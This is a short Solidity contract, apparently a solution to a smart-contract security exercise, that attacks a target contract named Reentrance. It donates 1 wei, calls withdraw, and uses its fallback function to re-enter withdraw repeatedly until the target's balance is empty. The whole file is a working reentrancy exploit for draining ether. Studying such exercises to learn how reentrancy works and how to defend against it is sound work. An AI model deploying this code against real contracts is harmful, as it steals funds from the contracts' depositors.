// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance reentranceContract;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        reentranceContract = Reentrance(_contractAddress);
    }

    function hackContract() external payable {
        // Code me!
        reentranceContract.donate{value: 1 }(address(this));
        reentranceContract.withdraw();
    }

    fallback() external payable {
        if(address(reentranceContract).balance != 0) {
            reentranceContract.withdraw();
        }
    }
}
